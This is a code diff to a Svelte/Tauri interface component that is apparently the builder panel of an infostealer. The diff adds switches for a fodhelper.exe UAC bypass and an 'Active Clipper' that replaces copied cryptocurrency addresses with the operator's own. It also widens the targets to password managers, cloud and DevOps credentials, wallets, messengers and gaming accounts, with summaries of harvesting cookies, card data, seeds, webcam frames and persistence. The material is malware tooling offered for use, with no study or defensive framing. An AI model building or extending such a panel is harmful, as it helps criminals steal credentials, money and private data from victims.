@@ -1,4 +1,5 @@
 <script lang="ts">
+  import { invoke } from "@tauri-apps/api/core";
   import { Button } from "$lib/components/ui/button";
   import {
     Accordion,
@@ -42,10 +43,14 @@
     captureWebcams?: boolean;
     captureClipboard?: boolean;
     persistence?: boolean;
+    uacBypass?: boolean;
+    clipper?: boolean;
     onToggleScreenshots?: () => void;
     onToggleWebcams?: () => void;
     onToggleClipboard?: () => void;
     onTogglePersistence?: () => void;
+    onToggleUacBypass?: () => void;
+    onToggleClipper?: () => void;
   };
 
   let {
@@ -58,10 +63,14 @@
     captureWebcams = false,
     captureClipboard = false,
     persistence = false,
+    uacBypass = false,
+    clipper = false,
     onToggleScreenshots = () => undefined,
     onToggleWebcams = () => undefined,
     onToggleClipboard = () => undefined,
     onTogglePersistence = () => undefined,
+    onToggleUacBypass = () => undefined,
+    onToggleClipper = () => undefined,
   }: Props = $props();
 
     const featureLinks: Record<string, string> = {
@@ -71,9 +80,13 @@
     "Slack": "https://slack.com",
     Skype: "https://www.skype.com",
     "Telegram": "https://desktop.telegram.org",
+    "Discord": "https://discord.com",
     Tox: "https://tox.chat",
     Viber: "https://www.viber.com",
     "WhatsApp": "https://www.whatsapp.com/download",
+    "Messenger": "https://www.messenger.com",
+    "WeChat": "https://www.wechat.com",
+    "Wire": "https://wire.com",
     Pidgin: "https://pidgin.im",
     "Psi": "https://psi-im.org",
     Outlook: "https://www.microsoft.com/outlook",
@@ -97,6 +110,12 @@
     "Trust Wallet": "https://www.trustwallet.com",
     "Ledger Live": "https://www.ledger.com/ledger-live",
     Phantom: "https://phantom.app",
+    MetaMask: "https://metamask.io",
+    "TronLink": "https://www.tronlink.org",
+    "Coinbase Wallet": "https://www.coinbase.com/wallet",
+    "Ronin": "https://roninwallet.io",
+    "Binance Chain": "https://www.bnbchain.org",
+    "Jaxx Liberty": "https://jaxx.io",
     "Google Chrome": "https://www.google.com/chrome",
     "Microsoft Edge": "https://www.microsoft.com/edge",
     Brave: "https://brave.com",
@@ -119,11 +138,35 @@
     WireGuard: "https://www.wireguard.com",
     OpenVPN: "https://openvpn.net",
     ProtonVPN: "https://proton.me/vpn",
+    Surfshark: "https://surfshark.com",
     Steam: "https://store.steampowered.com",
     "Epic Games Launcher": "https://www.epicgames.com/store",
     "Battle.net": "https://www.blizzard.com",
     "Riot Client": "https://www.riotgames.com",
     "Ubisoft Connect": "https://www.ubisoft.com",
+    "EA Desktop": "https://www.ea.com/ea-app",
+    "Roblox": "https://www.roblox.com",
+    "Minecraft": "https://www.minecraft.net",
+    "AWS": "https://aws.amazon.com",
+    "Azure": "https://azure.microsoft.com",
+    "GCP": "https://cloud.google.com",
+    "Kubernetes": "https://kubernetes.io",
+    "Docker": "https://www.docker.com",
+    "Terraform": "https://www.terraform.io",
+    "Git": "https://git-scm.com",
+    "VS Code": "https://code.visualstudio.com",
+    "Postman": "https://www.postman.com",
+    "FileZilla": "https://filezilla-project.org",
+    "WinSCP": "https://winscp.net",
+    "Cyberduck": "https://cyberduck.io",
+    "Bitwarden": "https://bitwarden.com",
+    "1Password": "https://1password.com",
+    "Dashlane": "https://www.dashlane.com",
+    "LastPass": "https://www.lastpass.com",
+    "KeePassXC": "https://keepassxc.org",
+    "NordPass": "https://nordpass.com",
+    "RoboForm": "https://www.roboform.com",
+    "Keeper": "https://www.keepersecurity.com",
   };
 const slugify = (value: string) =>
     value
@@ -133,58 +176,15 @@ const slugify = (value: string) =>
   const iconSrc = (value: string) => `/logos/${slugify(value)}.svg`;
   const handleFeatureClick = (label: string) => {
     const link = featureLinks[label];
-    if (!link || typeof window === "undefined") return;
-    window.open(link, "_blank", "noopener");
+    if (!link) return;
+    invoke("plugin:opener|open_url", { url: link }).catch(console.error);
   };
 
   const detailSections: FeatureDetail[] = [
     {
-      title: "Messengers",
-      summary: "Grabs tokens, cache, and local storage from every supported desktop messenger, including Jabber clients.",
-      items: [
-        "Element",
-        "ICQ",
-        "Signal",
-        "Slack",
-        "Skype",
-        "Telegram",
-        "Tox",
-        "Viber",
-        "WhatsApp",
-        "Pidgin",
-        "Psi",
-      ],
-    },
-    {
-      title: "Email Clients",
-      summary: "Extracts profiles, cached mailboxes, and configuration from widely used email clients.",
-      items: ["Outlook", "Thunderbird", "Mailbird", "Mailspring"],
-    },
-    {
-      title: "Wallets",
-      summary: "Crawls every monitored wallet/storage location and LevelDB store for encrypted keys and session metadata.",
-      items: [
-        "Ethereum",
-        "Electrum Wallets",
-        "Dash",
-        "Bytecoin",
-        "Bitcoin",
-        "Atomic Wallet",
-        "Armory",
-        "Exodus",
-        "Litecoin",
-        "Monero",
-        "Zcash",
-        "Coinomi",
-        "Guarda",
-        "Zephyr",
-        "Trust Wallet",
-      ],
-    },
-    {
       title: "Browsers",
       summary:
-        "Collects bookmarks, cookies, history, passwords, autofill, and credit card data from every supported Chromium/Chromium-based browser.",
+        "Collects passwords, cookies, history, bookmarks, autofill, and credit card data from Chromium and Gecko-based browsers.",
       items: [
         "Google Chrome",
         "Microsoft Edge",
@@ -205,14 +205,100 @@ const slugify = (value: string) =>
       ],
     },
     {
-      title: "VPNs & Services",
-      summary: "Gathers configuration files, logs, and recent connections from common VPN clients and services.",
-      items: ["NordVPN", "ExpressVPN", "TunnelBear", "WireGuard", "OpenVPN", "ProtonVPN"],
+      title: "Messengers",
+      summary: "Grabs tokens, sessions, and local databases from desktop messengers and communication apps.",
+      items: [
+        "Telegram",
+        "Discord",
+        "WhatsApp",
+        "Messenger",
+        "WeChat",
+        "Signal",
+        "Slack",
+        "Skype",
+        "Viber",
+        "Wire",
+        "ICQ",
+        "Tox",
+        "Pidgin",
+        "Psi",
+        "Element",
+      ],
     },
     {
-      title: "Gaming & Extras",
-      summary: "Scrapes gaming platform clients for session data and extra recovery artifacts.",
-      items: ["Steam", "Epic Games Launcher", "Battle.net", "Riot Client", "Ubisoft Connect"],
+      title: "Wallets",
+      summary: "Extracts keys, seeds, and session metadata from desktop wallets and browser extensions.",
+      items: [
+        "Exodus",
+        "Atomic Wallet",
+        "Electrum Wallets",
+        "Ethereum",
+        "Jaxx Liberty",
+        "Coinomi",
+        "Guarda",
+        "Zephyr",
+        "Dash",
+        "Monero",
+        "Bitcoin",
+        "Armory",
+        "Bytecoin",
+        "Zcash",
+        "Trust Wallet",
+        "MetaMask",
+        "Phantom",
+        "TronLink",
+        "Coinbase Wallet",
+        "Ronin",
+        "Binance Chain",
+      ],
+    },
+    {
+      title: "DevOps & Cloud",
+      summary: "Recovers credentials and configuration for cloud providers, infrastructure, and version control.",
+      items: ["AWS", "Azure", "GCP", "Kubernetes", "Docker", "Terraform", "Git"],
+    },
+    {
+      title: "Developer Tools",
+      summary: "Extracts settings, sessions, and bookmarks from IDEs, API clients, and FTP/SSH tools.",
+      items: ["VS Code", "Postman", "FileZilla", "WinSCP", "Cyberduck"],
+    },
+    {
+      title: "Password Managers",
+      summary: "Extracts local databases and extension data from standalone and browser-based password managers.",
+      items: [
+        "Bitwarden",
+        "1Password",
+        "Dashlane",
+        "LastPass",
+        "KeePassXC",
+        "NordPass",
+        "RoboForm",
+        "Keeper",
+      ],
+    },
+    {
+      title: "Gaming",
+      summary: "Scrapes login tokens and session data from major gaming platforms and Minecraft variants.",
+      items: [
+        "Steam",
+        "Roblox",
+        "Minecraft",
+        "Ubisoft Connect",
+        "EA Desktop",
+        "Epic Games Launcher",
+        "Battle.net",
+        "Riot Client",
+      ],
+    },
+    {
+      title: "VPNs & Services",
+      summary: "Gathers configuration files and session data from common VPN clients.",
+      items: ["NordVPN", "ExpressVPN", "TunnelBear", "WireGuard", "OpenVPN", "ProtonVPN", "Surfshark"],
+    },
+    {
+      title: "Email Clients",
+      summary: "Extracts profiles, cached mailboxes, and configuration from widely used email clients.",
+      items: ["Outlook", "Thunderbird", "Mailbird", "Mailspring"],
     },
     {
       title: "Screenshots",
@@ -220,15 +306,23 @@ const slugify = (value: string) =>
     },
     {
       title: "Webcam",
-      summary: "Snapshots one frame per detected webcam device (auto depends on drivers and permissions).",
+      summary: "Snapshots one frame per detected webcam device.",
     },
     {
       title: "Clipboard",
-      summary: "Logs plaintext/Unicode text and bitmap image data currently stored in the Windows clipboard.",
+      summary: "Logs plaintext and image data currently stored in the Windows clipboard.",
     },
     {
       title: "Persistence",
-      summary: "Copies the agent to a hidden system directory and registers a startup key to ensure it runs on every reboot.",
+      summary: "Installs the agent to a hidden directory and registers for startup to ensure survival across reboots.",
+    },
+    {
+      title: "UAC Bypass",
+      summary: "Attempts to escalate to administrative privileges via fodhelper.exe registry hijacking.",
+    },
+    {
+      title: "Active Clipper",
+      summary: "Monitors clipboard for cryptocurrency addresses and replaces them with your own in real-time.",
     },
   ];
 
@@ -428,6 +522,48 @@ const slugify = (value: string) =>
         <Label class="text-sm">Persistence</Label>
       </div>
       <Switch data-feature-switch class="cursor-pointer" checked={persistence} />
+    </div>
+    <div
+      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
+      role="button"
+      tabindex="0"
+      onclick={(event) => {
+        const target = event.target as HTMLElement | null;
+        if (target?.closest?.("[data-feature-switch]")) return;
+        onToggleUacBypass();
+      }}
+      onkeydown={(event) => {
+        if (event.key === "Enter" || event.key === " ") {
+          event.preventDefault();
+          onToggleUacBypass();
+        }
+      }}
+    >
+      <div class="space-y-0.5">
+        <Label class="text-sm">UAC Bypass</Label>
+      </div>
+      <Switch data-feature-switch class="cursor-pointer" checked={uacBypass} />
+    </div>
+    <div
+      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
+      role="button"
+      tabindex="0"
+      onclick={(event) => {
+        const target = event.target as HTMLElement | null;
+        if (target?.closest?.("[data-feature-switch]")) return;
+        onToggleClipper();
+      }}
+      onkeydown={(event) => {
+        if (event.key === "Enter" || event.key === " ") {
+          event.preventDefault();
+          onToggleClipper();
+        }
+      }}
+    >
+      <div class="space-y-0.5">
+        <Label class="text-sm">Active Clipper</Label>
+      </div>
+      <Switch data-feature-switch class="cursor-pointer" checked={clipper} />
     </div>
   </div>
 </div>
